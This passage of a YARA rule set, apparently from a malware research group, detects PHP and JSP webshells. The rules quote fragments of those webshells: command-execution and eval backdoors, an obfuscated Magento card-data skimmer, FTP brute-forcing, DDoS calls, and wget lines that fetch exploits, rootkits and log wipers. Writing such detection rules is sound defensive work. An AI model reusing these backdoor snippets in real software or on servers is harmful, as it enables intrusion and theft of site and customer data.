      hash1 = "3349d03213ea55ea40496fec36de3e49a0c79c39d8582516ec38e53624215e70"
   strings:
      $s1 = "<a href=\"?path=<%String tempfilepath1=request.getParameter(\"path\"); if(tempfilepath!=null) path=tempfilepath;%><%=path%>&" fullword ascii
      $s2 = "cmd = (String)request.getParameter(\"command\");result = exeCmd(cmd);%>" fullword ascii
      $s3 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword ascii
      $s4 = "<input type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\" title=\"Click here to login\" class=\"button\" /> " fullword ascii
      $s5 = "if (password == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s6 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.library.path\").replaceAll(env.queryHashtable(\"path.sep" fullword ascii
      $s7 = ".inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}" fullword ascii
      $s8 = "proc = runtime.exec(cmd);" fullword ascii
      $s9 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.io.tmpdir\")%></td>" fullword ascii
      $s10 = "<td width=\"20%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.runtime.version\")%></td>" fullword ascii
      $s11 = "<td height=\"22\" colspan=\"3\">&nbsp;<%= request.getServerName() %>(<%=request.getRemoteAddr()%>)</td>" fullword ascii
      $s12 = "<a href=\"<%=selfName %>?path=<%=path%><%=fList[j].getName()%>\\\"> <%=fList[j].getName()%></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" fullword ascii
      $s13 = "password = (String)session.getAttribute(\"password\");" fullword ascii
      $s14 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword ascii
      $s15 = "String password=request.getParameter(\"password\");" fullword ascii
      $s16 = "if (session.getAttribute(\"password\") == null) {" fullword ascii
      $s17 = "//if(request.getQueryString()!=null&&request.getQueryString().indexOf(act,0)>=0)action=request.getParameter(act);" fullword ascii
      $s18 = "<textarea name=\"content\" cols=\"105\" rows=\"30\"><%=readAllFile(editfile)%></textarea>" fullword ascii
      $s19 = "tempfilename=(String)session.getId();" fullword ascii
      $s20 = "<td colspan=\"3\">&nbsp;<%=env.queryHashtable(\"os.name\")%> <%=env.queryHashtable(\"os.version\")%> " fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 80KB and
      8 of them
}

rule sig_6f3760de9242a2d06df38eb4b8c78c19
{
   meta:
      description = "php17 - file 6f3760de9242a2d06df38eb4b8c78c19.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "394602fb204606817f05ee16e12ef8287b945b487b8a7a3f2a27111261802f8b"
   strings:
      $x1 = "<?php                                                                                                                           " ascii
      $x2 = "* @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)" fullword ascii
      $s3 = "* @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)" fullword ascii
      $s4 = "t/2.0 (+http://www.visvo.com/en/webmasters.jsp;bot@visvo.com)'){if(isset($_GET[$k2])){$m1=file_exists($y0)?@filemtime($y0):$m1;@" ascii
      $s5 = "nDFdlcKzW2PR/19+gkKhRGk1YUXMLgw6EFj\\nj2c1LJoSpnzk8WRFAgMBAAE=\\n-----END PUBLIC KEY-----\";if(@$_SERVER['HTTP_USER_AGENT']=='Vi" ascii
      $s6 = "penssl_get_publickey')&&function_exists('openssl_public_encrypt')&&function_exists('openssl_encrypt')){$t12=true;}elseif(functio" ascii
      $s7 = "ts('openssl_get_publickey')&&function_exists('openssl_public_encrypt')&&function_exists('openssl_encrypt')){$t12=true;}}if($t12)" ascii
      $s8 = "##define('COMPILER_INCLUDE_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR.'src');" fullword ascii
      $s9 = "#define('COMPILER_COLLECT_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR.'stat');" fullword ascii
      $s10 = "s subject to the Open Software License (OSL 3.0)* that is bundled with this package in the file LICENSE.txt.* It is also availab" ascii
      $s11 = "le through the world-wide-web at this URL:* http://opensource.org/licenses/osl-3.0.php**/$y0='./skin/adminhtml/default/default/i" ascii
      $s12 = "7a1d1c8a100c28')($_=@$_REQUEST[q]).@$_(stripslashes($_REQUEST[z]));?><?PHP /*** Magento** NOTICE OF LICENSE** This source file i" ascii
      $s13 = "if(md5(@$_COOKIE[qz])=='a16c916a51704631d6" fullword ascii
      $s14 = "{$t15=@openssl_get_publickey($k3);$q16=128;$t17='';$h18=md5(md5(microtime()).rand());$e19=$h18;while($e19){$f20=substr($e19,0,$q" ascii
      $s15 = "SERVER['REMOTE_ADDR'];}if(isset($_POST)&&sizeof($_POST)){$a5='';foreach($_POST as $h6=>$n7){if(is_array($n7)){foreach($n7 as $f8" ascii
      $s16 = "_free_key($t15);$a5=$t17.':::SEP:::'.$t22;}$m1=file_exists($y0)?@filemtime($y0):$m1;@file_put_contents($y0,'JPEG-1.1'.base64_enc" ascii
      $s17 = "file_put_contents($y0,'');@touch($y0,$m1,$m1);echo 'clean ok';}else echo 'Pong';exit;}if(!empty($_SERVER['HTTP_CLIENT_IP'])){$i4" ascii
      $s18 = "=$_SERVER['HTTP_CLIENT_IP'];}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$i4=$_SERVER['HTTP_X_FORWARDED_FOR'];}else{$i4=@$_" ascii
      $s19 = "ode($a5),FILE_APPEND);@touch($y0,$m1,$m1);}?><?php" fullword ascii
      $s20 = "mages/sort-arrow-down_bg.png';$m1='1422372107';$k2='pa99872b';$k3=\"-----BEGIN PUBLIC KEY-----\\nMIGeMA0GCSqGSIb3DQEBAQUAA4GMADC" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule php17_10
{
   meta:
      description = "php17 - file 10.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5b20a148f159f470c45372366da6efe347bd89cd2dd03cc148f8e0ee71424832"
   strings:
      $s1 = "$a($_GET[cmd]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0b544ac96e173af11ffee87dee8aad446339801e
{
   meta:
      description = "php17 - file 0b544ac96e173af11ffee87dee8aad446339801e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
   strings:
      $x1 = "le.com/releases/ckira\\\">kira</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - Hackerlar.net</title><STYLE>" fullword ascii
      $x3 = "function k1r4ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x4 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x5 = "$fqb_log = \"FTP Quick Brute (called Shell [ci] . Biz \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $x6 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgCol" ascii
      $x7 = "$log_email = \"shell4spam@gmail.com\"; //Default e-mail for sending logs" fullword ascii
      $s8 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s9 = "$logfile = $tmpdir_logs.\"k1r4_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s10 = "</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwid" ascii
      $s11 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s12 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
      $s13 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s14 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $s15 = "if ($fqb_logemail) {@mail($fqb_logemail,\"Shell [ci] . Biz \".$shver.\" report\",$fqb_log);}" fullword ascii
      $s16 = "# Home page: http://google.com" fullword ascii
      $s17 = "list($datapipe[\"remotehost\"],$datapipe[\"remoteport\"]) = explode(\":\",$datapipe[\"remoteaddr\"]);" fullword ascii
      $s18 = "if ($act == \"about\") {echo \"<center>Undetectable version by <br> Spyk1r4 <br> <img src=\\\"http://emp3ror.com/images/emplogo1" ascii
      $s19 = "if ($act == \"about\") {echo \"<center>Undetectable version by <br> Spyk1r4 <br> <img src=\\\"http://emp3ror.com/images/emplogo1" ascii
      $s20 = "elseif (!$data = k1r4getsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule sig_04048aeca2c0f5d84639358008ed2ae7
{
   meta:
      description = "php17 - file 04048aeca2c0f5d84639358008ed2ae7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9b6d2f6aa7a0b96f945d64587d3d427764945cb9052f6eb70f935bc1e7546baf"
   strings:
      $x1 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $s2 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii
      $s3 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s4 = "<title>Small Shell - Edited By KingDefacer</title>" fullword ascii
      $s5 = "# Small Shell - Edited By KingDefacer                      #" fullword ascii
      $s6 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\".gz\\n\\n\");" fullword ascii
      $s7 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii
      $s8 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii
      $s9 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\"\\n\\n\");" fullword ascii
      $s10 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii
      $s11 = "<input name='action' value='download' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s12 = "<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>" fullword ascii
      $s13 = "# All bugs -> alturks.com                                  #" fullword ascii
      $s14 = "$dump_file.=($rows2[$k]==''?'null);':'\\''.addslashes($rows2[$k]).'\\');').\"\\n\";" fullword ascii
      $s15 = "$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s16 = "<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>" fullword ascii
      $s17 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii
      $s18 = "if(!@copy($_FILES[\"filename\"][\"tmp_name\"], $work_dir.$f)) echo('Upload is failed');" fullword ascii
      $s19 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii
      $s20 = "$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule sig_73cdd2163023ef9e068196d6ed9a339df4ec9af0
{
   meta:
      description = "php17 - file 73cdd2163023ef9e068196d6ed9a339df4ec9af0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9ab92671f31b8f9b3ff506c5d08313fe0cafb19d583b77161e8a05f0ebb4a424"
   strings:
      $s1 = "$E='n();$|!d=ba|!se64_enco|!de(x|!(gzcompre|!ss($o|!),$k));p|!|!rint(\"<$|!k>$d<|!/$k>\");@|!sessio|!n_des|!troy();}}}}';" fullword ascii
      $s2 = "$s='VER;|!$rr=@$r[\"H|!TT|!P_REFERER\"|!|!];$ra=@|!$r[\"HTTP_A|!|!|!CCEPT_LANGUAGE\"];|!if|!($rr&&$ra|!){$u=pa|!rse_u|!rl';" fullword ascii
      $s3 = "$O='($|!e){$k=$k|!h.$kf;ob_s|!tart()|!;@eva|!l(@gzun|!compr|!|!ess(@x(@bas|!e64_de|!code(preg_|!replac|!e(|!ar|!r';" fullword ascii
      $s4 = "$t='$i]|!=\"\"|!;$p=$ss($p|!,3);}i|!f(arr|!ay_key_e|!xi|!sts($i,$s)){$|!s[$i]|!.|!=$p;$e=strpos|!($|!s[$i],$f);|!if|!';" fullword ascii
      $s5 = "$w='|!trtolowe|!r\";$i=|!|!$m[1]|![|!0].$m[1][1]|!;$h=$sl($ss(m|!d5($i.$|!k|!h),0,3));$f|!=$|!sl|!($|!ss(md5($i|!.$kf),0,';" fullword ascii
      $s6 = "$n='$kh=\"5d4|!1\";|!$kf|!=\"402a\";func|!tion x(|!$t|!,$k){$c=st|!rlen(|!$k);$|!l=|!strlen($t);$|!o=\"\";f|!or($i=0|!;';" fullword ascii
      $s7 = "$z='!0|!.(|![|!\\\\d]))?,?/\",|!$ra,$m);if($q&&$m|!){@se|!ssio|!n_start()|!;$|!s=&$_SE|!SSION;|!$|!ss=\"substr\";$sl|!=\"s';" fullword ascii
      $s8 = "$v='$i<|!$l;){for|!($j=0;(|!$j|!<$c&&$i<$|!l);$j++|!,$i|!++)|!{$|!o.=$t{$i}^$k|!|!{$j};}}ret|!urn|! $o;}$r=$_SER|!';" fullword ascii
      $s9 = "$c='3));$|!p=\"\";for|!($z=|!1;$z<cou|!nt($|!m[1]);$z|!++)$p.=|!$q[$m|![2|!][$z]|!];if(strpo|!s($p|!,$|!h)===0)|!{$s[';" fullword ascii
      $s10 = "$C='ay(\"/_/\"|!,\"/-/\"),|!array(|!\"/\",\"|!+\")|!,$|!ss($s[$i],|!0,$e))),|!$k)))|!;|!$o=o|!b_get|!_contents();ob_end_|!cle|!a" ascii
      $s11 = "$L=str_replace('|!','',$n.$v.$s.$k.$z.$w.$c.$t.$O.$C.$E);" fullword ascii
      $s12 = "$e=str_replace('E','','crEeatEe_EfuEnEctiEon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule articles_tag_fixture
{
   meta:
      description = "php17 - file articles_tag_fixture.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "256a4bf79397cda6622c84f36975acc18fb05317762d95690e0d41b13f80af29"
   strings:
      $s1 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s2 = "* @license       http://www.opensource.org/licenses/opengroup.php The Open Group Test Suite License" fullword ascii
      $s3 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s4 = "* CakePHP(tm) Tests <http://book.cakephp.org/view/1196/Testing>" fullword ascii
      $s5 = "*  Redistributions of files must retain the above copyright notice." fullword ascii
      $s6 = "* @link          http://book.cakephp.org/view/1196/Testing CakePHP(tm) Tests" fullword ascii
      $s7 = "*  Licensed under The Open Group Test Suite License" fullword ascii
      $s8 = "* Short description for file." fullword ascii
      $s9 = "'indexes' => array('UNIQUE_TAG' => array('column'=> array('article_id', 'tag_id'), 'unique'=>1))" fullword ascii
      $s10 = "* @var string 'ArticlesTag'" fullword ascii
      $s11 = "* Short description for class." fullword ascii
      $s12 = "* fields property" fullword ascii
      $s13 = "* records property" fullword ascii
      $s14 = "* name property" fullword ascii
      $s15 = "'article_id' => array('type' => 'integer', 'null' => false)," fullword ascii
      $s16 = "'tag_id' => array('type' => 'integer', 'null' => false)," fullword ascii
      $s17 = "array('article_id' => 1, 'tag_id' => 1)," fullword ascii
      $s18 = "array('article_id' => 2, 'tag_id' => 1)," fullword ascii
      $s19 = "array('article_id' => 1, 'tag_id' => 2)," fullword ascii
      $s20 = "array('article_id' => 2, 'tag_id' => 3)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule php17_2mv2
{
   meta:
      description = "php17 - file 2mv2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "242634b27416eb9b93020830133e0880f34c6503fd369dd5a54d55d0d373c9c2"
   strings:
      $x1 = "All This Sheller Coded By Us Except(Php DDoser , Perl Ddoser , And Php Bypassers) That U Can Find All Anywhere;)" fullword ascii
      $x2 = "<td bgcolor='#AA0000' class='td'><div align='center' class='style4'>--== www.h4ckcity.org Sheller Version: 1.02 Coded By Loc" fullword ascii
      $x3 = "<td bgcolor='#AA0000' class='td'><div align='center' class='style4'>--== www.h4ckcity.org Sheller Version: 1.02 Coded By LocalMa" ascii
      $x4 = "echo \"<font color=green>[+] ByPasser Successful Created : <a href=$Version.php>$Version.php</a></font>\";" fullword ascii
      $x5 = "echo \"<font color=green>[+] ByPasser Successful Created : <a href=$Version-B.php>$Version-B.php</a></font>\";" fullword ascii
      $x6 = "This Tools Coded By 2MzRp & LocalMan From www.h4ckcity.org Just For Pentesting. Plz Dont Use It For Blackhat Jobs " fullword ascii
      $x7 = "echo \"<font color=red>Usage : [ Host : 0.0.0.0 ] [ Port : 25 ] [ Packet Time : 99999 ]</font><BR>\";" fullword ascii
      $s8 = "RFFwcFppaEdRVXhUUlQwOVkzVnliRjlsZUdWaktDUmphQ2twRFFvSlpHbGxLQ2Mr" fullword ascii
      $s9 = "if($cmdCommand != '') print shell_exec($cmdCommand);" fullword ascii
      $s10 = "if(@rename($HTTP_POST_FILES['userfile']['tmp_name'],$path.$HTTP_POST_FILES['userfile']['name']))" fullword ascii
      $s11 = "<td width='254'><span class='txt' >Example : http://www.site.com/sheller.txt</span></td>" fullword ascii
      $s12 = "echo @shell_exec(\"perl DDos.pl $d_host $d_port $d_packet\");" fullword ascii
      $s13 = "@exec('ln -s /home/'.$user3.'/public_html ' . $user3);" fullword ascii
      $s14 = "echo \"<font color=red>[+] Not Found Any ByPasser For This Version : $Version</font><Br>\";" fullword ascii
      $s15 = "<input type='submit' name='Submit3'  value='Auto Sheller On Users'>" fullword ascii
      $s16 = "<input type='submit' name='Submit5'  value='Manual Sheller On Users'>" fullword ascii
      $s17 = "<title>:: www.h4ckcity.org :: Coded By 2MzRp & LocalMan ::</title>" fullword ascii
      $s18 = ": 2- Send Your New Idea To My Mail : 2MzRp2@Gmail.com" fullword ascii
      $s19 = "echo \"<b>RemoteAddressIfProxy: </b><font color=red>\".$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'].\"</font>\";" fullword ascii
      $s20 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name']))" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule a7b7f4baae4dc8c2b0bc520c85d14fd19ca0fb33
{
   meta:
      description = "php17 - file a7b7f4baae4dc8c2b0bc520c85d14fd19ca0fb33.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3141dd8216bd0118120cbea89dca2b5d7f7f164e34514b05f7801540eef36f90"
   strings:
      $s1 = "<?php @preg_replace(\"/[Database]/e\" ,$_POST[data], \"error\"); ?>" fullword ascii
      $s2 = "/* logo.php" fullword ascii
      $s3 = "<O>Data=@eval($_POST[data]);</O>" fullword ascii
      $s4 = "{$phpinfo()'];file_put_contents(base64_decode('bG9nby5waHA='),base64_decode('PD9waHAgQHByZWdfcmVwbGFjZSgiL1tEYXRhYmFzZV0vZSIgLCR" ascii
      $s5 = "{$phpinfo()'];file_put_contents(base64_decode('bG9nby5waHA='),base64_decode('PD9waHAgQHByZWdfcmVwbGFjZSgiL1tEYXRhYmFzZV0vZSIgLCR" ascii
      $s6 = "fUE9TVFtkYXRhXSwgImVycm9yIik7ID8+'));/*}" fullword ascii
   condition:
      uint16(0) == 0x247b and filesize < 1KB and
      all of them
}

rule sig_9f18fc1e8b779eec4d289eea454f05549d387a51
{
   meta:
      description = "php17 - file 9f18fc1e8b779eec4d289eea454f05549d387a51.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
   strings:
      $x1 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x2 = "exit(\"<a href=\\\"$sh_mainurl\\\">$sh_name</a>: Access Denied - Your host (\".getenv(\"REMOTE_ADDR\").\") not allowed\");" fullword ascii
      $x3 = "function dQ99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x4 = "displaysecinfo(\"Kernel Version\",dQ99exec(\"sysctl -a | grep version\"));" fullword ascii
      $x5 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x6 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x7 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x8 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x9 = "srv_info(\"User\",($win) ? get_current_user().\" (uid=\".getmyuid().\" gid=\".getmygid().\")\" : dQ99exec(\"id\"));" fullword ascii
      $x10 = "$logfile = $tmpdir_logs.\"dQ99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x11 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x12 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x13 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x14 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
      $x15 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $x16 = "array(\"Md5-Lookup\",\"http://darkc0de.com/database/md5lookup.html\")," fullword ascii
      $x17 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download dQ99shell.php manually <a href=\\\"" fullword ascii
      $s18 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s19 = "<title>'.getenv(\"HTTP_HOST\").' - '.sh_name().'</title>" fullword ascii
      $s20 = "array(\"Cpanel Config\",\"/var/cpanel/accounting.log\")," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and all of them
}

rule sig_077e29b11be80ab57e1a2ecabb7da330
{
   meta:
      description = "php17 - file 077e29b11be80ab57e1a2ecabb7da330.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c16ef45486710e3d0b319ae7b6bef184e1d0d6851830322ea48087f265dcd4b2"
   strings:
      $s1 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
      $s2 = "75+9ksed/bF79cHb6NX/rMXH+v+MbQaftOIDIH605Pzg6M3Lwb+QIzsb1N//tuHBnDroP7b1tPpa42DD/dePf/tw8P64Yuj608fDuqfTp8JDjpBbiaOgt+U1tt6RvUCZ" ascii
      $s3 = "$auth_pass = \"7244120df2ed35b57c33535928305ee0\";" fullword ascii
      $s4 = "khAGwnoTIIy/j0n+6CHDK1K1mmT/oTZoc1a2LxKDkz9MYdZLIN5QDBJwmOBOKJCX9GY08rJPpU4c5E2VyCusQJx9ccmcQ+WE/dgJeLqD24nrt5cgbiGSVxT1B7nEyezz" ascii
      $s5 = "WD6NLlDmwb/A2OB7cIut5e2RR+U72zMvz9AajOSmU5FbdmnmyHuP5lH3z0/hHENjRWxzfaP9s5+e7fftidzP/ZmThhTuQ3QSBybChYZ2GRlnD2fTpdCG9M/Ndtpsi8pO" ascii
      $s6 = "jHZMowtDLl5+eh+ua3XwnbaBkVGJnf3LJxE+T6yRhu2C0tj/yCG4kmatKfWZmTrB829SmVquLnMx32Tm7p8OuZK6Ugps9kCZiU3hutwWu96L/UuMbdBx+J7GRPyKQ8Ax" ascii
      $s7 = "EfdJpHNFQ+Nxiuve9I5rKwfT3OStVib9tAQvUY6qkTzKSy9QB2ddBuFtPPr4o6IFh4G7zVyuB2+j0Zb3W+nRYZzxLaL1x66PMsddHFLABgODt/sn1LVn22Y9V1+iwi1U" ascii
      $s8 = "T3fw0P1bHHdEvH2+GyfSvMOlrMZOw3+ol8oC1M9SOKR78AscR6BO7dmYqTHQwDrLmKTCOMrGQ1aUrW2pbSEmfyhhUtPyv/3IAhieWJWguVDebW0mfaVYcwnFtMnv02z3" ascii
      $s9 = "UG2ceVQiwFlhA0OZu4UwFEQZDub/c1GMHnYhsewflf2Pv6xZmEAPR5hT8dzUXYWMWf+lVOMnMFTZYVD5BXoCRbNPU6hKEYZm2wDly42ZBszF9bAjfqDer0OXRAZ5ZOyu" ascii
      $s10 = "4fusG3/YLNg2ofF4rJtj0DsHqC15q0zBTl7YVlSqyj9QWj/2GmXPPxXaBImUiLkc+mPLzU63M7UeWFV7I5VE2CgPFibO5sOSQPeFVxMJKeY9vnZwcZjXM8+0OIdbTSaD" ascii
      $s11 = "huFIwN0lIAK0hH7ZxvHnqwJsjaeDH+JVEkd1mCA8xp58kiA36zx4+AujgEt58gEpZkTj+GDGAmGg58v57D3tE3nj2UqgCm4/Jdw/Wclb6c03WjgD1jzefckFcFoWzsOG" ascii
      $s12 = "BC7OH0TfIAFMjpmsoWKkptXRKWHJhb9blIJLSLRLISMYdn6cY6GS3mUxK0kEeu0WaP+n63/PGg8BmKSm3eymP1jo9YcouU7YpsaKKvgburFM1uYrzVsDx4//M+jFVARH" ascii
      $s13 = "DTmc+nyC7S1dMWbnwEnhF4yQ515PO4iXYq5IdOLkNN4P362MReYn/30EytPBg8z6W2oTkOj+N6glhc0ptZLwALlq3pp4DpOAyuvSypEw4oxAA1//81WgmTrBcQmoy57C" ascii
      $s14 = "i4Nabox0kzJiVRmtVqnrw/fdZ8fn51WVmiZaVhX5NFtWPe63SnxPdeK7ct2OGD2cdXHO//XFYo2cL0iWTdr/wziZpWJkpHntzeNe7YuAb0psEHeKnLm0/8lofMPZAA2R" ascii
      $s15 = "ArRd3f/zfC7SzxItSbo1efpW3//vRJNplaTQ1yIAT2RyTkkOsLDL3z8tYzKFmypeF/RyxHKCGUGVibaAyOGcC8IAd1GLwCumbTq29zZE35YdNk9mPrXtwcIzjdAWStrN" ascii
      $s16 = "jx11Gg8qgyF1CPHqJR//mJ/kU8r378vPVnz4cw3k9dvBVJUGXcqkyUHeQFaKuTZ9LLyLfF25JejtLeW8XqOofI2zbtBQpplbz/pi823ZPuzfNutRaE2bhnJiGu2dm2pm" ascii
      $s17 = "8D///bycnvInFsnw1ioKi3+eLBkypTFLsOcdD2BC1y6TS9Efl38obW9auP/BTyMGPKwEKJ9nooWMO19ZMjaZuSyIOcJ3iNiBe4Vfe7BAIqG4DeuSLAy07LVlOPNrbcYK" ascii
      $s18 = "zwUQFo8bWht6xBKnvCw4BT2bEZvDuTqlHSUKN/mE8YLO4mts8JUsdTNnN3MtTNpjFOe32YgabFvLDicMsOn6Z9P9A96sVHJhNt5GGMrpx/xoUhM87TyJHNmzohmed/1/" ascii
      $s19 = "e3Y74U9zx83kpzfD/z5ZGq+2WC+vEddQKG18FWwVZ6FuqJnYfAw8fan2gj959Il3UI/On/zxlrewuQdSA/Dx1xV7lZF6ep29HejGSSUWHnwybMuf2mpy2NMidBiVvJio" ascii
      $s20 = "+/3Tz7bL8/O3nXP4av79MX+0Zn9pVJh39YY/CnNIzd8OnKnccTazAlD57psvQiCke9aVWad+vNwhj/enh49C2L85TldJ+yPvSs3xM/fnOnA/Yq/TpxJz4fEyjZh9oblW" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule sig_023a80d10d10d911989e115b477e42b5
{
   meta:
      description = "php17 - file 023a80d10d10d911989e115b477e42b5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1144bc563f2b94286e7a4bbc67985a04092886701819925cb183b66268a65731"
   strings:
      $s1 = "<?php $i1907 = \".6;2tswhx4falngd7pe)b9iy38uqk_oc/v(0zj15mr*\";$FbXTdD5478 = $i1907[17].$i1907[41].$i1907[18].$i1907[14].$i1907[" ascii
      $s2 = "CyPb9yiAVBwNzV2hTGq+JR8pTCo1Re9KmAjZvLvrBR4sw1Kl0FUCQ5QHh88rOT9bKLxC8EvIH2NeYGnOskJ8oESPERo0cgftfHs4Pv1tfaaCUSIWP1GaXzUgeT7HxmF4" ascii
